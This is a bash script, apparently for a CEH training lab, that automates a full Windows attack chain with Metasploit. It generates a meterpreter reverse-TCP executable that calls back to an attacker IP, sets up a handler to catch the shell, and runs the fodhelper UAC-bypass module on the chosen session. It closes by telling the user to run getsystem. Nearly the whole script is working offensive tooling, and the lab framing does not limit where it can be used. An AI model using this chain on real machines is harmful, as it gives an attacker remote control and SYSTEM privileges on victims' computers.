#!/bin/bash

# ==============================================================================
# CEH Lab 2: UAC Bypass & Privilege Escalation (Reliability Version)
# ==============================================================================

# Ensure the script is run as root
if [[ "$EUID" -ne 0 ]]; then 
    echo "[ERROR] Please run as root (sudo su)" >&2
    exit 1
fi

echo "--- Lab 2 Configuration ---"

# 1. FIX: Robust IP Validation using Python
while true; do
    read -p "Enter Attacker IP (LHOST): " LHOST
    if python3 - "$LHOST" <<'PY'
import ipaddress, sys
try:
    ipaddress.IPv4Address(sys.argv[1])
    sys.exit(0)
except ValueError:
    sys.exit(1)
PY
    then
        break
    else
        echo "[!] Invalid IPv4 address (e.g., 10.10.1.13). Please try again."
    fi
done

# Port Validation
while true; do
    read -p "Enter Attacker Port (LPORT): " LPORT
    if [[ $LPORT =~ ^[0-9]+$ ]] && [ "$LPORT" -ge 1 ] && [ "$LPORT" -le 65535 ]; then
        break
    else
        echo "[!] Invalid port number. Please enter a value between 1-65535."
    fi
done

# Define Paths
EXE_PATH="/home/attacker/Desktop/Windows.exe"
HANDLER_RC="handler.rc"
ESCALATE_RC="escalate.rc"

# 2. FIX: Check output directory before generating the file
mkdir -p /home/attacker/Desktop || 
    { echo "[ERROR] Cannot create output directory."; exit 1; }

[[ -w /home/attacker/Desktop ]] || 
    { echo "[ERROR] Output directory is not writable."; exit 1; }

# Payload Generation
echo -e "\n[*] Generating Windows Payload..."
rm -f "$EXE_PATH" # Ensure a fresh file
if msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > "$EXE_PATH"; then
    if [ -s "$EXE_PATH" ]; then
        echo "[+] SUCCESS: Payload generated."
        echo "[!] FILE LOCATION: $(realpath "$EXE_PATH")"
    else
        echo "[ERROR] Payload file is empty." >&2
        exit 1
    fi
else
    echo "[ERROR] msfvenom failed." >&2
    exit 1
fi

# Resource File Creation
echo "[*] Creating Metasploit resource files..."
cat <<EOF > "$HANDLER_RC"
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
run -j
EOF

cat <<EOF > "$ESCALATE_RC"
# This is a template; the session ID will be handled in the final step
use exploit/windows/local/bypassuac_fodhelper
set LHOST $LHOST
set TARGET 0
exploit
EOF

# 4. FIX: Check that resource files were actually created and not empty
[[ -s "$HANDLER_RC" ]] || 
    { echo "[ERROR] Handler resource file is missing or empty."; exit 1; }

[[ -s "$ESCALATE_RC" ]] || 
    { echo "[ERROR] Escalation resource file is missing or empty."; exit 1; }

echo -e "\n===================================================================="
echo "STAGE 1: ESTABLISHING CONNECTION"
echo "1. Transfer the file to the target: $EXE_PATH"
echo "2. Execute the file on the Windows 11 machine."
echo "===================================================================="

# 3. FIX: Make the Metasploit pause explicit
echo "[INFO] Metasploit is now running in the foreground."
echo "[INFO] Bash will continue only after Metasploit exits."
msfconsole -r "$HANDLER_RC"
msf_status=$?
echo "[INFO] Metasploit exited with status: $msf_status"

echo -e "\n===================================================================="
echo "STAGE 2: PRIVILEGE ESCALATION"

# 5. FIX: Correct the session-ID assumption (Verify state instead of assuming 1)
echo "[*] Please check your active sessions in Metasploit using 'sessions -l'"
read -p "Enter the active Session ID you wish to escalate: " SID

if [[ -z "$SID" ]]; then
    echo "[ERROR] Session ID cannot be empty."
    exit 1
fi

# Create a temporary RC for the specific validated session
cat <<EOF > "temp_esc.rc"
use exploit/windows/local/bypassuac_fodhelper
set session $SID
set LHOST $LHOST
set TARGET 0
exploit
EOF

echo "[*] Launching Escalation for Session $SID..."
msfconsole -r "temp_esc.rc"

echo -e "\n[!] FINAL STEP: Once the new session opens, manually run:"
echo "    getsystem -t 1"
echo "    getuid"
echo "===================================================================="
